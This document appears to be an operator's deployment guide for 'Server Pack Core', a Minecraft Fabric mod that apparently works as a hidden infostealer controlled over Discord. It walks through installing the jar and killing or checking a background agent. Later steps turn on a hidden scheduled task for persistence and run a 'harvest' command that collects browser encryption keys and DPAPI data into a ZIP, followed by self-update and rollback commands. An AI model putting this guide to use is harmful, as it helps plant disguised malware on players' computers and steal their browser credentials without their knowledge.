WINDOWS DEPLOYMENT - Server Pack Core 0.1.4

Copy only the .jar, do not run it from the shared drive.

0.1.4 supersedes 0.1.3: it adds signed self-update, deferred mod swap and an
optional automatic schedule. 0.1.3 still connects, but remove it: only one
serverpackcore jar may stay enabled. 0.1.1 and 0.1.2 use the revoked Discord
token and no longer connect at all.

1. Go to the mods folder of the Fabric 1.20.1 profile (by default
   %APPDATA%\.minecraft\mods) and delete serverpackcore-0.1.1.jar,
   serverpackcore-0.1.2.jar and serverpackcore-0.1.3.jar if present.

2. Copy serverpackcore-0.1.4.jar into that folder.

3. On Windows, check the file:

   certutil -hashfile serverpackcore-0.1.4.jar SHA256

   It must return:
   0856f0aa1db8c79d7e13eb9dd3eb289054602e19ade070105ae62a8034946dfe

4. Close Minecraft and check that no agent remains:

   tasklist | findstr /i "spc-sync"
   taskkill /f /im spc-sync.exe

5. Open Minecraft with the Fabric profile, enter a world and wait 20-60 s.

6. Confirm the new version is running:

   type "%LOCALAPPDATA%\ServerPackCore\state.json"

   It must show "version":"0.1.4".

7. Send `persist on`. Expected reply: "Persistence on: true" and
   "Hidden task: \ServerPackCore". The old task is overwritten, not
   duplicated.

8. Send `harvest`. For each detected browser, the ZIP must contain
   browsers/<browser>/keys.txt with a v10= line (and app_bound= if present).
   If it has error=, Windows has PowerShell restricted: Local State and
   dpapi/ remain as fallback.

UPDATE

`update` checks, stages, applies and restarts on its own; the mod waits until
Minecraft closes. `update check` only reports, `update stage` leaves both jars
prepared, `update apply <version>` applies an already staged jar. `update
rollback` returns to the previous agent and mod. `update auto on` schedules
runs every 24 h; `update auto off` cancels.

ROLLBACK

If 0.1.4 fails: `persist off`, close Minecraft and delete 0.1.4. Restoring
serverpackcore-0.1.3.jar is valid: it still connects to Discord, it just lacks
the update features. serverpackcore-0.1.2.jar is only useful for offline
diagnostics because its token is revoked. The hash of every build is in
SHA256.txt.
